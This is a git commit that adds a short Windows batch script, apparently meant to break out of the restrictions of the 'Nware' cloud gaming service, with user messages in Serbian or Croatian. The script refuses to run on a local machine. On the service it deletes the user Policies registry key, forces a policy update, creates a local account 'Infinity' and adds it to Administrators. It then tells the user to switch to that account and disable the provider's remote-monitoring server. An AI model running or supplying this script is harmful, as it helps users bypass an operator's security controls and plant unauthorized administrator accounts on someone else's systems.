9c719995b1f38a4136596eacdd19a85e05735ac9
IceBear <69987100+OxIceBear@users.noreply.github.com>
2024-04-07 13:40:50 +0200

    basic logic

---
+++ limore.bat
@@ -0,0 +1,44 @@
+@echo off
+
+echo [+] Credits:
+echo [+] oxIceBear - Infinity Community -
+timeout /t 1 /nobreak >nul
+echo [+] oxIceBear - Infinity Community -
+timeout /t 1 /nobreak >nul
+echo [+] oxIceBear - Infinity Community -
+timeout /t 1 /nobreak >nul
+echo [+] LOGOVI:
+echo [+] Detektujem NWSYS....
+
+if exist C:\Users\Administrator (
+    goto nx
+) else (
+    color 4
+    echo [+] Pokrenuo si ovaj program na tvojoj lokalnoj masini, molim te, pokreni na Nware cloud gaming servicu.
+    timeout /t 10 /nobreak >nul
+    exit /b 1
+)
+
+:nx
+
+color 3
+
+reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies" /f
+
+gpupdate /force
+
+echo [+] Netuser je omogućen!
+
+echo [+] Kreiranje novog korisnika...
+net user Infinity /add
+timeout /t 1 /nobreak >nul
+
+echo [+] Dodeljivanje administratorskih privilegija korisniku Infinity...
+net localgroup Administrators Infinity /add
+timeout /t 1 /nobreak >nul
+
+
+cls
+color 12
+echo [+] Limore 24/7 omogucen, samo se brebaci na novi user, takodje disableuj tvnserver u taskmgr
+pause
